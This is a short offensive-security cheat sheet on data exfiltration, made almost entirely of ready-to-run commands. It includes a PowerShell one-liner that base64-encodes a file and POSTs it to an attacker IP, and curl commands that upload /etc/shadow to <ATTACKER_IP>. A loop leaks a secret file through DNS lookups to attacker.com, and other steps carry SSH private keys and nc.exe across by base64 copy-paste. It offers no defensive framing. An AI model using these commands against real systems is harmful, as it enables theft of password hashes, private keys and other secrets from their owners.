# Exfiltration
```table-of-contents
```
## HTTP Upload (PowerShell)
```powershell
# Requires a function like Invoke-FileUpload or simple One-Liner
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Secrets\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
```
## HTTPS Upload
```shell
# Standard Upload
curl -X POST http://<ATTACKER_IP>:8000/upload -F 'files=@/etc/shadow'

# HTTPS Upload (Insecure to ignore self-signed cert)
curl -X POST https://<ATTACKER_IP>:443/upload -F 'files=@/etc/shadow' --insecure
```
## ICMP & DNS Exfiltration
```shell
# DNS (Hex encoded queries)
xxd -p secret.txt > hex.txt
for i in $(cat hex.txt); do dig $i.attacker.com; done
```
## Base64 Copy-Paste (No Network)
### 1. Encode (Windows)
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\System32\drivers\etc\hosts" -Encoding byte))
```
### 2. Decode (Linux)
```shell
# Decode back to binary
echo -n 'BASE64_STRING...' | base64 -d > id_rsa

# Check Integrity (MD5)
md5sum id_rsa
```
### 3. Encode (Linux) to Decode (Windows)
```shell
# Linux: Encode
cat id_rsa | base64 -w 0
```

```powershell
# Windows: Decode
[IO.File]::WriteAllBytes("C:\Temp\nc.exe", [Convert]::FromBase64String("PASTED_STRING"))
```
## SSH Key Transfer (Verify Integrity)
```shell
# 1. Check MD5 on Source
md5sum id_rsa

# 2. Transfer (Copy/Paste or Download)

# 3. Check MD5 on Destination
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```